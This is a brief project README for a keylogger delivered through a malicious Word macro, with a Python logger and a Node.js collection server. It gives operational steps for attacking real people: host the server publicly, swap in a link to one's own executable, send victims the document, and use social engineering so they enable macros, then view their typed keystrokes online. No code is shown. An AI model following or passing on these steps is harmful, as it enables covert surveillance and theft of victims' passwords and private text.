# Word_key_logger
This a malware created with python keys node server and the the word macros exploit. The code runs on localhost for ease of use
How to try the project - send someone the wordfile and set up the node js server to be deployed on something like vercel and also make the py script to be with the real site instead of localhost. For the vba replace the link with a link to your own exe.
When someone gives permission to macros via some kind of social engineering you will se what they type at http://your_website_name/view
